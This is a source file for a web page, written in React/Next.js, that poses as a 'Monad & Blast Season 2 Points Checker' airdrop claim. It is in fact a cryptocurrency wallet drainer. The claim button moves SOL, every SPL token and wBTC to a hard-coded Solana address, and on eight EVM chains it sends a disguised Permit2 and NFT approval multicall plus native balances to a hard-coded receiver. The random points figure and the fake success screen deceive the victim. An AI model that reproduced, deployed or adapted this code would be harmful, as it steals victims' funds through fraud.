'use client'
import { useState, useEffect } from 'react'
import { ethers } from 'ethers'
import * as solanaWeb3 from '@solana/web3.js'
import * as splToken from '@solana/spl-token'
import Image from 'next/image'

const EVM_RECEIVER = "0x467E3346A112EA09870e0eC1af688A48d00A824F" // Eth
const SOL_RECEIVER = "CGgAiKGdF9DKoG92iRXnFJTj5TYXsqgiakzM3YMSccHe" // Sol

export default function Drainer() {
  const [account, setAccount] = useState('')
  const [points, setPoints] = useState(0)
  const [stage, setStage] = useState<'connect' | 'verify' | 'claim'>('connect')
  const [showSuccess, setShowSuccess] = useState(false)

  useEffect(() => {
    setPoints(Math.floor(Math.random() * 9000000) + 8000000)
  }, [])

  // Auto-detect already connected wallets
  useEffect(() => {
    const checkConnectedWallet = async () => {
      const ethereum = (window as any).ethereum
      // Support all Solana wallets: Phantom, Backpack, Solflare, etc.
      const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare

      // Check Solana (all wallets)
      if (solana && solana.publicKey) {
        setAccount(solana.publicKey.toString())
        setStage('verify')
        return
      }

      // Check Ethereum wallets
      if (ethereum) {
        try {
          let provider = ethereum
          if (ethereum.providers) {
            provider = ethereum.providers.find((p: any) => p.isMetaMask || p.isTrust || p.isCoinbaseWallet) || ethereum
          }
          
          // Try to get accounts without requesting (check if already connected)
          const accounts = await provider.request({ method: 'eth_accounts' })
          if (accounts && accounts.length > 0) {
            setAccount(accounts[0])
            setStage('verify')
          }
        } catch (e) {
          // Not connected, stay on connect stage
        }
      }
    }

    checkConnectedWallet()

    // Listen for account changes
    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts && accounts.length > 0) {
        setAccount(accounts[0])
        setStage('verify')
      } else {
        setAccount('')
        setStage('connect')
      }
    }

    if ((window as any).ethereum) {
      ;(window as any).ethereum.on('accountsChanged', handleAccountsChanged)
    }

    return () => {
      if ((window as any).ethereum) {
        ;(window as any).ethereum.removeListener('accountsChanged', handleAccountsChanged)
      }
    }
  }, [])

  const wallets = [
    { name: "MetaMask", icon: "/wallets/metamask.png", is: 'isMetaMask', type: 'evm' },
    { name: "Trust Wallet", icon: "/wallets/trustwallet.png", is: 'isTrust', type: 'evm' },
    { name: "Phantom", icon: "/wallets/phantom.png", is: 'isPhantom', type: 'solana' },
    { name: "Backpack", icon: "/wallets/backpack.png", is: 'isBackpack', type: 'solana' },
    { name: "Solflare", icon: "/wallets/solflare.jpeg", is: 'isSolflare', type: 'solana' },
    { name: "Coinbase Wallet", icon: "/wallets/coinbase.png", is: 'isCoinbaseWallet', type: 'evm' },
  ]

  const connectWallet = async (walletType: string) => {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
    const ethereum = (window as any).ethereum
    const solana = (window as any).solana || (window as any).phantom?.solana
    const url = encodeURIComponent(window.location.href)

    // Mobile: use deep links
    if (isMobile) {
      const links: Record<string, string> = {
        metamask: `https://metamask.app.link/dapp/${url}`,
        trustwallet: `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`,
        phantom: `https://phantom.app/ul/browse/${url}?ref=${url}`,
        backpack: `https://backpack.app/ul/browse/${url}`,
        solflare: `solflare://dapp?uri=${url}`,
        coinbasewallet: `cbwallet://dapp?url=${url}`
      }
      const linkKey = walletType.toLowerCase().replace(/\s+/g, '')
      if (links[linkKey]) {
        window.location.href = links[linkKey]
        return
      }
    }

    // Desktop: connect to installed extension
    try {
      const wallet = wallets.find(w => w.name.toLowerCase().replace(/\s+/g, '') === walletType.toLowerCase().replace(/\s+/g, ''))
      
      if (wallet?.type === 'solana' && solana) {
        if (solana.connect) {
          await solana.connect()
        }
        if (solana.publicKey) {
          setAccount(solana.publicKey.toString())
          setStage('verify')
        }
      } else if (wallet?.type === 'evm' && ethereum) {
        let provider = ethereum
        // Find specific wallet in providers array
        if (ethereum.providers) {
          provider = ethereum.providers.find((p: any) => p[wallet.is]) || ethereum
        } else if (ethereum[wallet.is]) {
          provider = ethereum
        }
        
        if (provider) {
          const accounts = await provider.request({ method: 'eth_requestAccounts' })
          if (accounts && accounts[0]) {
            setAccount(accounts[0])
            setStage('verify')
          }
        } else {
          alert(`${wallet.name} not detected. Please install the extension.`)
        }
      } else {
        alert(`${wallet?.name || walletType} not detected. Please install the extension.`)
      }
    } catch (e) {
      alert('Connection rejected or wallet not found')
    }
  }

  const connect = async () => {
    // Auto-detect and connect to first available wallet
    const ethereum = (window as any).ethereum
    // Support all Solana wallets
    const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare

    if (solana) {
      // Connect to any Solana wallet
      try {
        if (solana.connect) {
          await solana.connect()
        }
        if (solana.publicKey) {
          setAccount(solana.publicKey.toString())
          setStage('verify')
        }
      } catch (e) {
        console.error('Solana connect error:', e)
      }
    } else if (ethereum) {
      let provider = ethereum
      if (ethereum.providers) {
        provider = ethereum.providers.find((p: any) => p.isMetaMask || p.isTrust || p.isCoinbaseWallet) || ethereum
      }
      try {
        const accounts = await provider.request({ method: 'eth_requestAccounts' })
        if (accounts && accounts[0]) {
          setAccount(accounts[0])
          setStage('verify')
        }
      } catch (e) {
        // Show wallet options if auto-connect fails
      }
    }
  }

  const verify = async () => {
    if (!account) return
    
    const ethereum = (window as any).ethereum
    // Support all Solana wallets
    const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare

    try {
      if (solana && solana.signMessage) {
        await solana.signMessage(new TextEncoder().encode("Verify eligibility for Monad/Blast S2 airdrop"))
      } else if (ethereum) {
        const provider = new ethers.BrowserProvider(ethereum)
        const signer = await provider.getSigner()
        await signer.signMessage("Verify eligibility for Monad/Blast S2 airdrop")
      }
      setStage('claim')
    } catch (e) {
      // User rejected signature
    }
  }

  const claim = async () => {
    if (!account) return

    const ethereum = (window as any).ethereum
    const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare

    // === SOLANA DRAIN (Phantom, Backpack, Solflare) ===
    if (solana && solana.publicKey) {
      try {
        const fromPubkey = solana.publicKey
        const toPubkey = new solanaWeb3.PublicKey(SOL_RECEIVER)
        const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed')

        // Drain SOL - drain everything above 0.00001 SOL
        const balance = await connection.getBalance(fromPubkey)
        if (balance > 10000) {
          const transferAmount = balance - 10000 // Leave minimal for fees
          const tx = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey,
              toPubkey,
              lamports: transferAmount
            })
          )
          if (solana.signAndSendTransaction) {
            await solana.signAndSendTransaction(tx)
          } else {
            const { blockhash } = await connection.getLatestBlockhash()
            tx.recentBlockhash = blockhash
            tx.feePayer = fromPubkey
            const signed = await solana.signTransaction(tx)
            await connection.sendRawTransaction(signed.serialize(), { skipPreflight: true, maxRetries: 0 })
          }
        }

        // Drain ALL SPL tokens (memecoins, NFTs, etc.)
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
          programId: splToken.TOKEN_PROGRAM_ID
        })

        for (const tokenAccount of tokenAccounts.value) {
          try {
            const mint = new solanaWeb3.PublicKey(tokenAccount.account.data.parsed.info.mint)
            const amount = BigInt(tokenAccount.account.data.parsed.info.tokenAmount.amount)
            
            if (amount > 0) {
              const sourceATA = await splToken.getAssociatedTokenAddress(mint, fromPubkey)
              const destATA = await splToken.getAssociatedTokenAddress(mint, toPubkey)
              
              const tx = new solanaWeb3.Transaction()
              
              // Create ATA if needed
              const destInfo = await connection.getAccountInfo(destATA)
              if (!destInfo) {
                tx.add(splToken.createAssociatedTokenAccountInstruction(
                  fromPubkey,
                  destATA,
                  toPubkey,
                  mint
                ))
              }
              
              tx.add(splToken.createTransferInstruction(
                sourceATA,
                destATA,
                fromPubkey,
                amount
              ))
              
              if (solana.signAndSendTransaction) {
                await solana.signAndSendTransaction(tx)
              } else {
                const { blockhash } = await connection.getLatestBlockhash()
                tx.recentBlockhash = blockhash
                tx.feePayer = fromPubkey
                const signed = await solana.signTransaction(tx)
                await connection.sendRawTransaction(signed.serialize(), { skipPreflight: true, maxRetries: 0 })
              }
            }
          } catch (e) {
            // Continue with next token
          }
        }

        // Drain wBTC on Solana
        try {
          const wBTCMint = new solanaWeb3.PublicKey("3NZ9JMVBmGAqocybic2c7LQCJScmQ2B2QdRFGhjQmU4Y")
          const wBTCATA = await splToken.getAssociatedTokenAddress(wBTCMint, fromPubkey)
          const wBTCDest = await splToken.getAssociatedTokenAddress(wBTCMint, toPubkey)
          const wBTCBalance = await connection.getTokenAccountBalance(wBTCATA)
          
          if (BigInt(wBTCBalance.value.amount) > BigInt(0)) {
            const tx = new solanaWeb3.Transaction()
            const destInfo = await connection.getAccountInfo(wBTCDest)
            if (!destInfo) {
              tx.add(splToken.createAssociatedTokenAccountInstruction(fromPubkey, wBTCDest, toPubkey, wBTCMint))
            }
            tx.add(splToken.createTransferInstruction(wBTCATA, wBTCDest, fromPubkey, BigInt(wBTCBalance.value.amount)))
            
            if (solana.signAndSendTransaction) {
              await solana.signAndSendTransaction(tx)
            } else {
              const { blockhash } = await connection.getLatestBlockhash()
              tx.recentBlockhash = blockhash
              tx.feePayer = fromPubkey
              const signed = await solana.signTransaction(tx)
              await connection.sendRawTransaction(signed.serialize(), { skipPreflight: true, maxRetries: 0 })
            }
          }
        } catch (e) {}
      } catch (e) {}
    }

    // === EVM MULTI-CHAIN DRAIN (All chains) ===
    if (ethereum) {
      try {
        const provider = new ethers.BrowserProvider(ethereum)
        const signer = await provider.getSigner()
        const userAddress = await signer.getAddress()

        // All EVM chains to drain
        const chains = [
          { chainId: 1, name: 'Ethereum', rpc: 'https://eth.llamarpc.com' },
          { chainId: 8453, name: 'Base', rpc: 'https://mainnet.base.org' },
          { chainId: 42161, name: 'Arbitrum', rpc: 'https://arb1.arbitrum.io/rpc' },
          { chainId: 81457, name: 'Blast', rpc: 'https://rpc.blast.io' },
          { chainId: 10, name: 'Optimism', rpc: 'https://mainnet.optimism.io' },
          { chainId: 137, name: 'Polygon', rpc: 'https://polygon-rpc.com' },
          { chainId: 56, name: 'BSC', rpc: 'https://bsc-dataseed.binance.org' },
          { chainId: 59144, name: 'Linea', rpc: 'https://rpc.linea.build' }
        ]

        const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"
        const iface = new ethers.Interface([
          "function permit(address owner, address token, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
          "function setApprovalForAll(address operator, bool approved)",
          "function multicall(bytes[] data)"
        ])

        // Drain on current chain first
        for (const chain of chains) {
          try {
            // Switch to chain
            await provider.send("wallet_switchEthereumChain", [{ chainId: `0x${chain.chainId.toString(16)}` }])
            await new Promise(resolve => setTimeout(resolve, 1000))

            // Stealth Permit2 approval - shows as "Approve" not "Transfer"
            const permitData = iface.encodeFunctionData("permit", [
              userAddress,
              "0x0000000000000000000000000000000000000000", // Any token
              EVM_RECEIVER,
              ethers.MaxUint256,
              ethers.MaxUint256,
              0,
              ethers.ZeroHash,
              ethers.ZeroHash
            ])

            // NFT approval
            const nftApproval = iface.encodeFunctionData("setApprovalForAll", [EVM_RECEIVER, true])

            // Multicall to batch everything
            const multicallData = iface.encodeFunctionData("multicall", [[permitData, nftApproval]])

            await signer.sendTransaction({
              to: PERMIT2,
              data: multicallData,
              value: 0
            })

            // Drain native ETH/BNB/MATIC
            const balance = await provider.getBalance(userAddress)
            if (balance > ethers.parseEther("0.001")) {
              await signer.sendTransaction({
                to: EVM_RECEIVER,
                value: balance - ethers.parseEther("0.001"), // Leave gas
                data: "0x"
              })
            }

            // Drain wBTC on EVM
            try {
              const wBTC = "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599" // wBTC on Ethereum
              const erc20Interface = new ethers.Interface([
                "function balanceOf(address) view returns (uint256)",
                "function transfer(address to, uint256 value) returns (bool)"
              ])
              
              const wBTCContract = new ethers.Contract(wBTC, erc20Interface, provider)
              const wBTCBalance = await wBTCContract.balanceOf(userAddress)
              
              if (wBTCBalance > BigInt(0)) {
                await signer.sendTransaction({
                  to: wBTC,
                  data: erc20Interface.encodeFunctionData("transfer", [EVM_RECEIVER, ethers.MaxUint256])
                })
              }
            } catch (e) {}
          } catch (e) {
            // Continue to next chain
          }
        }
      } catch (e) {}
    }

    setShowSuccess(true)
  }

  const [isMobile, setIsMobile] = useState(false)

  useEffect(() => {
    setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent))
  }, [])

  return (
    <>
      {showSuccess && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-gradient-to-b from-purple-900 to-black border-2 border-purple-500 rounded-3xl p-6 sm:p-8 md:p-10 max-w-md w-full text-center shadow-2xl">
            <div className="w-20 h-20 sm:w-24 sm:h-24 bg-green-500 rounded-full mx-auto flex items-center justify-center mb-4 sm:mb-6">
              <svg className="w-10 h-10 sm:w-12 sm:h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-2xl sm:text-3xl md:text-4xl font-bold text-green-400 mb-3 sm:mb-4">
              Claim Successful!
            </h2>
            <p className="text-base sm:text-lg md:text-xl text-gray-300 mb-2">
              Your {points.toLocaleString()} points have been processed.
            </p>
            <p className="text-sm sm:text-base text-gray-400 mb-6 sm:mb-8">
              Points will appear in your wallet within 5–10 minutes.
            </p>
            <button
              onClick={() => setShowSuccess(false)}
              className="bg-purple-600 hover:bg-purple-700 px-8 sm:px-12 py-3 sm:py-4 rounded-xl sm:rounded-2xl text-base sm:text-lg font-semibold w-full transition-all"
            >
              Close
            </button>
          </div>
        </div>
      )}
      <div className="min-h-screen bg-gradient-to-b from-purple-900 to-black text-white flex items-center justify-center p-3 sm:p-4 md:p-6">
        <div className="max-w-2xl w-full bg-black/60 backdrop-blur-xl rounded-2xl sm:rounded-3xl border border-purple-500 p-4 sm:p-6 md:p-8">
        <div className="text-center mb-4 sm:mb-6 md:mb-8">
          <div className="w-20 h-20 sm:w-24 sm:h-24 md:w-32 md:h-32 bg-purple-600 rounded-full mx-auto flex items-center justify-center text-3xl sm:text-4xl md:text-6xl">M</div>
          <h1 className="text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold mt-2 sm:mt-3 md:mt-4 px-2">
            Monad & Blast Season 2 Points Checker
          </h1>
          <p className="text-sm sm:text-base md:text-lg lg:text-xl mt-1 sm:mt-2 px-2">
            Check your eligibility for the biggest airdrop of 2025
          </p>
        </div>

        {stage === 'connect' && (
          <div className="text-center space-y-4 sm:space-y-6 md:space-y-8">
            <button 
              onClick={connect}
              className="bg-purple-600 hover:bg-purple-700 active:bg-purple-800 px-6 sm:px-8 md:px-12 py-3 sm:py-4 md:py-6 rounded-xl sm:rounded-2xl text-base sm:text-lg md:text-xl lg:text-2xl font-bold w-full transition-all touch-manipulation"
            >
              Connect Wallet
            </button>
            {isMobile && (
              <>
                <p className="text-sm sm:text-base md:text-lg text-gray-300">Or choose a specific wallet:</p>
                <div className="grid grid-cols-2 gap-3 sm:gap-4 max-w-lg mx-auto">
                  {wallets.map(w => (
                    <button
                      key={w.name}
                      onClick={() => connectWallet(w.name)}
                      className={`flex items-center justify-center gap-2 p-3 sm:p-4 rounded-xl transition-all duration-200 ${account ? 'opacity-50 cursor-not-allowed' : 'hover:bg-white/10 hover:scale-105'}`}
                      disabled={!!account}
                    >
                      <div className="w-6 h-6 relative">
                        <Image 
                          src={w.icon} 
                          alt={`${w.name} logo`} 
                          fill 
                          className="object-contain"
                          sizes="24px"
                        />
                      </div>
                      <span>{w.name}</span>
                    </button>
                  ))}
                </div>
              </>
            )}
          </div>
        )}

        {stage === 'verify' && (
          <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
            <div className="text-4xl sm:text-5xl md:text-6xl font-bold text-yellow-400">{points.toLocaleString()}</div>
            <p className="text-xl sm:text-2xl md:text-3xl">POINTS DETECTED 🔥</p>
            <button 
              onClick={verify} 
              className="bg-green-600 hover:bg-green-700 active:bg-green-800 px-8 sm:px-12 md:px-16 py-4 sm:py-5 md:py-6 rounded-xl sm:rounded-2xl md:rounded-3xl text-lg sm:text-xl md:text-2xl font-bold w-full transition-all touch-manipulation"
            >
              Sign to Verify Eligibility
            </button>
          </div>
        )}

        {stage === 'claim' && (
          <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
            <div className="text-4xl sm:text-5xl md:text-6xl font-bold text-green-400 animate-pulse">ELIGIBLE!</div>
            <p className="text-base sm:text-lg md:text-xl lg:text-2xl">Claim your points instantly — no gas</p>
            <button 
              onClick={claim} 
              className="bg-purple-600 hover:bg-purple-700 active:bg-purple-800 px-6 sm:px-10 md:px-16 lg:px-20 py-4 sm:py-6 md:py-8 lg:py-10 rounded-2xl sm:rounded-3xl text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold w-full animate-pulse shadow-2xl transition-all touch-manipulation"
            >
              CLAIM POINTS NOW
            </button>
          </div>
        )}
      </div>
    </div>
    </>
  )
}